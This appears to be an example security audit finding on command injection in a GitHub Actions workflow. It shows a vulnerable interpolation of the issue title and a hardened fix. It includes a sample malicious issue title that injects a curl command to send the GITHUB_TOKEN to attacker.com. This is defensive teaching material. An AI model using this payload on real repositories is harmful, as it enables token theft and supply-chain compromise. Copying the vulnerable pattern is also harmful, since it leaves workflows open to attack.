# Example CI/CD Security Audit Finding: Workflow Script Injection

### Finding Details
- **Title:** Remote Code Execution via Untrusted Issue Title in GitHub Actions
- **Severity:** Critical (CVSS 9.8)
- **Standard:** OpenSSF Scorecard / SLSA Level 3
- **CWE:** CWE-78 (OS Command Injection)

### Vulnerable Workflow
```yaml
name: Triage Issue
on:
  issues:
    types: [opened]

jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: Process Title
        # Direct string interpolation of untrusted user input!
        run: echo "Processing issue: ${{ github.event.issue.title }}"
```
An attacker submits an issue titled: `Test \"; curl https://attacker.com/steal?token=$GITHUB_TOKEN #` which executes arbitrary bash commands on the runner.

### Hardened Workflow
```yaml
      - name: Process Title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "Processing issue: $ISSUE_TITLE"
```
